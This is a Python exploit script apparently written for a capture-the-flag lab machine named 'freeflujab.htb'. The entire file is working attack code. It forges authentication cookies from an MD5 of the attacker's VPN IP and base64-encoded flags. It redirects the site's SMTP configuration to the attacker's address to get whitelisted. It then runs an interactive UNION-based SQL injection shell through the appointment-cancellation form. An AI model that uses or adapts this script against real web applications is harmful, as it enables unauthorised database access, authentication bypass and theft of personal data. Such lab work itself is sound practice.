#!/usr/bin/python
import urllib,requests,hashlib,base64
import netifaces as ni
from sys import exit
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
	ni.ifaddresses('tun0')
	ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

	m = hashlib.md5()
	m.update(ip)
	patient = m.hexdigest() # Patient=md5sum(ip)
	modus = 'Q29uZmlndXJlPVRydWU%3d' # Configure=True
	preRegistered = '{}=True'.format(patient) # preRegistered=md5sum(ip)=True [Non-base64]
	registered = urllib.quote_plus(base64.b64encode(preRegistered))

	cookies = {
	    'Modus': '{}'.format(modus),
	    'Patient': '{}'.format(patient),
	    'Registered': '{}'.format(registered)
	}

	whitelist(ip,cookies)
	sqli(ip,cookies)

def whitelist(ip,cookies):
	headers = {
	    'Host': 'freeflujab.htb',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Accept-Encoding': 'gzip, deflate',
	    'Referer': 'https://freeflujab.htb/?smtp_config',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Content-Length': '59',
	    'Connection': 'close',
	    'Upgrade-Insecure-Requests': '1'
	}

	data = 'mailserver={}&port=25&save=Save+Mail+Server+Config'.format(ip)

	response = requests.post('https://freeflujab.htb/?smtp_config', headers=headers, cookies=cookies, data=data, verify=False)

def sqli(ip,cookies):
	headers = {
	    'Host': 'freeflujab.htb',
	    'Connection': 'close',
	    'Content-Length': '84',
	    'Cache-Control': 'max-age=0',
	    'Origin': 'https://freeflujab.htb',
	    'Upgrade-Insecure-Requests': '1',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	    'Referer': 'https://freeflujab.htb/?book',
	    'Accept-Encoding': 'gzip, deflate',
	    'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
	    'X-Originating-IP': ip,
	    'X-Forwarded-For': ip,
	    'X-Remote-IP': ip,
	    'X-Remote-Addr': ip
	}

	while True:
		try:
			sqlcmd = raw_input("SQL Command: ")
		except KeyboardInterrupt:
			exit()
		statement = "' UNION SELECT 1,2,{},4,5-- -".format(sqlcmd)
		data = 'nhsnum=NHS-945-486-5117{}&submit=Cancel+Appointment'.format(urllib.quote_plus(statement))

		r = requests.post('https://freeflujab.htb/?cancel', headers=headers, cookies=cookies, data=data, verify=False)

if __name__ == '__main__':
	main()
